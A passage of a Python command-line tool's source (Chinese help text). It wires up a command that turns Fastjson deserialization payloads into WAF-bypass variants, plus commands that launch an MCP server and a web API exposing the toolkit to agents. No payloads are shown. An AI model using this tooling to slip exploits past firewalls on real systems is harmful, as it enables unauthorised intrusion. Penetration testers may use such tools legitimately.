        help="原始 JSON payload；也可配合 --file / stdin",
    ),
    file: Optional[str] = typer.Option(None, "--file", "-f", help="从文件读取 payload"),
    technique: Optional[list[str]] = typer.Option(
        None,
        "--technique",
        "-t",
        help="变换 id，可重复；默认生成全部单项变体",
    ),
    mode: str = typer.Option(
        "variants",
        "--mode",
        help="variants=各单项变体；stack=按 -t 顺序叠加",
    ),
    list_tech: bool = typer.Option(False, "--list", help="列出可用变换后退出"),
    pad_size: int = typer.Option(20000, "--pad-size", help="pad 填充长度"),
    comma_count: int = typer.Option(5, "--comma-count", help="多逗号数量"),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
) -> None:
    """对 Fastjson payload 做 WAF 绕过变换（本地生成，不发包）。"""
    from fastjson_toolkit.waf import WafOptions, WafRequest, list_techniques, run_waf

    if list_tech:
        table = Table(title="WAF 绕过变换")
        table.add_column("ID")
        table.add_column("Title")
        table.add_column("Description")
        for t in list_techniques():
            table.add_row(t.id, t.title, t.description)
        rprint(table)
        raise typer.Exit(0)

    raw = payload
    if file:
        from pathlib import Path

        raw = Path(file).read_text(encoding="utf-8")
    if raw is None:
        import sys

        if not sys.stdin.isatty():
            raw = sys.stdin.read()
    if not raw or not str(raw).strip():
        raise typer.BadParameter("请提供 payload 参数、--file 或 stdin")

    req = WafRequest(
        payload=str(raw).strip(),
        techniques=list(technique or []),
        mode=mode,
        options=WafOptions(pad_size=pad_size, comma_count=comma_count),
    )
    try:
        result = run_waf(req)
    except ValueError as exc:
        raise typer.BadParameter(str(exc)) from exc

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
        raise typer.Exit(0)

    rprint(Panel(result.summary, title="WAF 绕过", border_style="cyan"))
    if mode == "stack" or (technique and mode == "stack"):
        rprint(result.payload)
    else:
        for v in result.variants:
            rprint(Panel(v.payload, title=f"{v.technique} — {v.title}", border_style="blue"))
    for note in result.notes:
        rprint(f"[dim]{note}[/dim]")
    raise typer.Exit(0)


@app.command("mcp")
def mcp_cmd(
    http: bool = typer.Option(
        False,
        "--http",
        help="启动独立 Streamable HTTP（默认 stdio）；也可用设置页启停",
    ),
    host: str = typer.Option("127.0.0.1", "--host", help="HTTP 监听地址"),
    port: int = typer.Option(8100, "--port", help="HTTP 端口"),
    token: Optional[str] = typer.Option(
        None,
        "--token",
        help="访问 Token（Authorization: Bearer / X-MCP-Token）；默认读 MCP_HTTP_TOKEN",
    ),
) -> None:
    """启动 MCP Server（默认 stdio；``--http`` 为独立 HTTP 服务）。"""
    load_dotenv()
    if not http:
        from fastjson_toolkit.mcp import run_stdio

        run_stdio()
        return

    from fastjson_toolkit.mcp.http_runtime import (
        build_mcp_http_app,
        load_mcp_http_config,
        mcp_public_url,
        save_mcp_http_config,
    )
    import uvicorn

    cfg_host, cfg_port, cfg_token = load_mcp_http_config()
    bind_host = host or cfg_host
    bind_port = port or cfg_port
    bind_token = (token if token is not None else cfg_token) or ""
    save_mcp_http_config(host=bind_host, port=bind_port, token=bind_token or None)
    app = build_mcp_http_app(token=bind_token)
    rprint(
        f"[cyan]MCP HTTP[/cyan] {mcp_public_url(bind_host, bind_port)}"
        + ("（已启用 Token）" if bind_token else "（无 Token）")
    )
    uvicorn.run(app, host=bind_host, port=bind_port, log_level="info")


@app.command("serve")
def serve_cmd(
    host: str = typer.Option("127.0.0.1", "--host"),
    port: int = typer.Option(8000, "--port"),
    reload: bool = typer.Option(
        True,
        "--reload/--no-reload",
        help="监听源码变更并自动重启（默认开启）",
    ),
) -> None:
    """启动 Web 后端 API（FastAPI / Uvicorn）。MCP HTTP 请在设置页或 ``fjtoolkit mcp --http`` 启停。"""
    load_dotenv()
    import uvicorn
    from pathlib import Path

    # package root: .../src/fastjson_toolkit/cli/main.py → project/src
    src_dir = Path(__file__).resolve().parents[2]
    kwargs: dict = {
        "app": "fastjson_toolkit.api.app:app",
        "host": host,
        "port": port,
        "reload": reload,
    }
    if reload:
        kwargs["reload_dirs"] = [str(src_dir)]
        kwargs["reload_includes"] = ["*.py"]

    uvicorn.run(**kwargs)


if __name__ == "__main__":
    app()
